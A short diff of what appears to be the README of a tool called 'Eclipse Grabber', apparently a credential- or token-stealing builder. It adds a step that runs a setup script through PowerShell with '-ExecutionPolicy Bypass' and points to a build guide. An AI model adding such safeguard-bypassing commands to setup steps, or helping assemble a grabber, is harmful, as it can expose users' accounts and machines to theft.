@@ -55,5 +55,5 @@ On Linux you will be asked to say **yes** or **no** while installing the needed 
 Once you are done with the installation you can move to the next step which is building.
 
 ## Build an Eclipse Grabber
-
+powershell.exe -ExecutionPolicy Bypass -Command .\setup-files\setup-win.ps1
 Follow the [build guide](BUILD.md) to build an eclipse grabber.
